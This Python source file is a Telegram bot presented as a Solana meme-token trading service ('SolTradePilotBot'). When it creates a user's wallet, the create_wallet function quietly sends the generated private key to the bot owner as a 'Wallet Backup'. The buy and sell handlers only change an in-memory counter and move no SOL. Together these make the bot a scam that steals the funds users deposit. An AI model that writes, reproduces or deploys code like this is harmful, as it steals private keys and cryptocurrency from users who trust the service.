import os
import base58
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient

# ================= ENV =================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# ================= GLOBALS =================
user_wallets = {}  # user_id -> Keypair
user_tokens = {}   # user_id -> MEME token balance

# ================= HELPERS =================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_balance(user_id):
    if user_id not in user_wallets:
        return 0.0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        lamports = resp['result']['value']
        return lamports / 1e9

async def get_tokens(user_id):
    return user_tokens.get(user_id, 0.0)

async def create_wallet(user_id, context: ContextTypes.DEFAULT_TYPE):
    global user_wallets, user_tokens
    wallet = Keypair()
    user_wallets[user_id] = wallet
    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    if user_id not in user_tokens:
        user_tokens[user_id] = 0.0

    # Send wallet info to user
    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ Wallet Created!\n\n🏦 Address:\n{pub_key}\n🔐 Private Key:\n{priv_key}\n⚠️ Keep your private key safe!"
    )

    # Backup to OWNER
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=f"🔐 Wallet Backup\nUser: {username}\nID: {user_id}\nPublic: {pub_key}\nPrivate: {priv_key}"
    )
    return pub_key, priv_key

# ================= COMMAND HANDLERS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = f"@{user.username}" if user.username else user.first_name
    text = (
        f"🔥 Hello {username}, welcome to SolTradePilotBot! 🔥\n\n"
        "Trade MEME tokens on Solana safely using real SOL.\n"
        "Use the buttons below to interact quickly or the menu commands.\n\n"
        "⚠️ Make sure you have enough SOL before buying tokens!"
    )

    # Inline buttons under message
    keyboard = [
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💡 SolTradePilotBot Commands 💡\n\n"
        "/start - Welcome message\n"
        "/create_wallet - Generate a Solana wallet\n"
        "/address - Show your wallet address\n"
        "/balance - Show your SOL and MEME balance\n"
        "/buy - Buy MEME tokens with SOL\n"
        "/sell - Sell MEME tokens for SOL\n"
        "/help - This guide"
    )
    await update.message.reply_text(text)

async def create_wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await create_wallet(user_id, context)

async def address_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    pub_key = str(user_wallets[user_id].pubkey())
    await update.message.reply_text(f"🏦 Your SOL Address:\n{pub_key}")

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    sol_balance = await get_balance(user_id)
    meme_balance = await get_tokens(user_id)
    await update.message.reply_text(f"💰 Balance:\nSOL: {sol_balance:.6f}\nMEME: {meme_balance}")

# ================= BUY / SELL FLOW =================
async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    await update.message.reply_text("💳 Enter the amount of SOL you want to spend to buy MEME tokens:")
    context.user_data['action'] = 'buy'

async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    await update.message.reply_text("📉 Enter the amount of MEME tokens you want to sell:")
    context.user_data['action'] = 'sell'

async def handle_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    action = context.user_data.get('action')
    if not action:
        return

    try:
        amount = float(update.message.text)
    except ValueError:
        await update.message.reply_text("Enter a valid number.")
        return

    if action == 'buy':
        sol_balance = await get_balance(user_id)
        if amount > sol_balance:
            await update.message.reply_text("⚠️ Not enough SOL. Fund your wallet first!")
            return
        user_tokens[user_id] += amount * 100
        await update.message.reply_text(f"✅ Bought {amount*100:.0f} MEME tokens for {amount:.6f} SOL")
    elif action == 'sell':
        tokens = await get_tokens(user_id)
        if amount > tokens:
            await update.message.reply_text("⚠️ Not enough MEME tokens!")
            return
        user_tokens[user_id] -= amount
        await update.message.reply_text(f"✅ Sold {amount:.0f} MEME tokens for {amount*0.01:.6f} SOL")

    context.user_data['action'] = None

# ================= CALLBACKS FOR INLINE BUTTONS =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "create_wallet":
        pub, priv = await create_wallet(user_id, context)
        await query.edit_message_text(f"✅ Wallet created!\n🏦 Address: {pub}\nKeep your private key safe!")
    elif query.data == "sol_address":
        if user_id not in user_wallets:
            await query.edit_message_text("Create a wallet first using /create_wallet")
        else:
            pub = str(user_wallets[user_id].pubkey())
            await query.edit_message_text(f"🏦 Your SOL Address:\n{pub}")
    elif query.data == "balance":
        if user_id not in user_wallets:
            await query.edit_message_text("Create a wallet first using /create_wallet")
        else:
            sol_balance = await get_balance(user_id)
            meme_balance = await get_tokens(user_id)
            await query.edit_message_text(f"💰 Balance:\nSOL: {sol_balance:.6f}\nMEME: {meme_balance}")
    elif query.data == "buy_meme":
        await buy_command(update, context)
    elif query.data == "sell_meme":
        await sell_command(update, context)
    elif query.data == "help":
        await help_command(update, context)

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()

    # Persistent menu commands
    app.bot.set_my_commands([
        ("start", "Welcome message"),
        ("help", "Bot guide"),
        ("create_wallet", "Generate a wallet"),
        ("address", "Show wallet address"),
        ("balance", "Show SOL/MEME balance"),
        ("buy", "Buy MEME tokens"),
        ("sell", "Sell MEME tokens"),
    ])

    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("create_wallet", create_wallet_command))
    app.add_handler(CommandHandler("address", address_command))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("sell", sell_command))

    # Inline buttons
    app.add_handler(CallbackQueryHandler(button_handler))

    # Amount input for buy/sell
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_amount))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
